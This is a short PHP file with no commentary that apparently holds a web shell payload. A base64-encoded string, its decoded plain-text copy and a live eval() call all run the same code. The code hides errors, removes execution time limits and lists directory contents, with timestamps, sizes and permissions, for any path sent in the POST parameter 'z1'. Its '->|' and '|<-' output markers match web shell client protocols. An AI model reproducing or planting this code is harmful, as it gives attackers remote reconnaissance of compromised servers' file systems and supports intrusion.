<?php


//var_dump( base64_decode('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtlY2hvKCItPnwiKTs7JEQ9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOyRGPUBvcGVuZGlyKCREKTtpZigkRj09TlVMTCl7ZWNobygiRVJST1I6Ly8gUGF0aCBOb3QgRm91bmQgT3IgTm8gUGVybWlzc2lvbiEiKTt9ZWxzZXskTT1OVUxMOyRMPU5VTEw7d2hpbGUoJE49QHJlYWRkaXIoJEYpKXskUD0kRC4iLyIuJE47JFQ9QGRhdGUoIlktbS1kIEg6aTpzIixAZmlsZW10aW1lKCRQKSk7QCRFPXN1YnN0cihiYXNlX2NvbnZlcnQoQGZpbGVwZXJtcygkUCksMTAsOCksLTQpOyRSPSJcdCIuJFQuIlx0Ii5AZmlsZXNpemUoJFApLiJcdCIuJEUuIgoiO2lmKEBpc19kaXIoJFApKSRNLj0kTi4iLyIuJFI7ZWxzZSAkTC49JE4uJFI7fWVjaG8gJE0uJEw7QGNsb3NlZGlyKCRGKTt9O2VjaG8oInw8LSIpO2RpZSgpOw=='));


//@ini_set("display_errors", "0"); @set_time_limit(0); echo("->|");; $D = $_POST["z1"] ?? "./"; $F = @opendir($D); if ($F == null) { echo("ERROR:// Path Not Found Or No Permission!"); } else { $M = null; $L = null; while ($N = @readdir($F)) { $P = $D . "/" . $N; $T = @date("Y-m-d H:i:s", @filemtime($P)); @$E = substr(base_convert(@fileperms($P), 10, 8), -4); $R = "\t" . $T . "\t" . @filesize($P) . "\t" . $E . ""; if (@is_dir($P)) { $M .= $N . "/" . $R; } else { $L .= $N . $R; } } echo $M . $L; @closedir($F); }; echo("|<-"); die();




eval('@ini_set("display_errors", "0"); @set_time_limit(0); echo("->|");; $D = $_POST["z1"] ?? "./"; $F = @opendir($D); if ($F == null) { echo("ERROR:// Path Not Found Or No Permission!"); } else { $M = null; $L = null; while ($N = @readdir($F)) { $P = $D . "/" . $N; $T = @date("Y-m-d H:i:s", @filemtime($P)); @$E = substr(base_convert(@fileperms($P), 10, 8), -4); $R = "\t" . $T . "\t" . @filesize($P) . "\t" . $E . ""; if (@is_dir($P)) { $M .= $N . "/" . $R; } else { $L .= $N . $R; } } echo $M . $L; @closedir($F); }; echo("|<-"); die();');
